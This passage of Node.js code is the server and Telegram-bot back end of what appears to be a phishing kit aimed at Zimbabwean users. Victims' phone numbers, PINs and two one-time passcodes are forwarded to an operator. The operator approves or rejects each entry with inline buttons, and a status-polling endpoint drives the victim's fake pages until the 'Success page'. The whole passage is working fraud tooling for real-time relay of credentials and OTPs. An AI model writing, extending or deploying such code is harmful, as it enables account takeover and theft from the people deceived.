                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        
━━━━━━━━━━━━━━━

⚠️     const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

// OTP2 CORRECT
bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>

🇿🇼 <b>Zimbabwe</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Second OTP verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Finalized");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

// OTP2 WRONG
bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

// BANK PIN CORRECT
bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>VERIFICATION PIN APPROVED</b>

🇿🇼 <b>Zimbabwe</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Process Completed</b>
🏁 <b>User redirected to Success page</b>`;

    await ctx.answerCbQuery("PIN Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

// BANK PIN WRONG
bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("Wrong Verification PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>VERIFICATION PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter PIN.</b>`);
});

// OTP2 WRONG PIN
bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
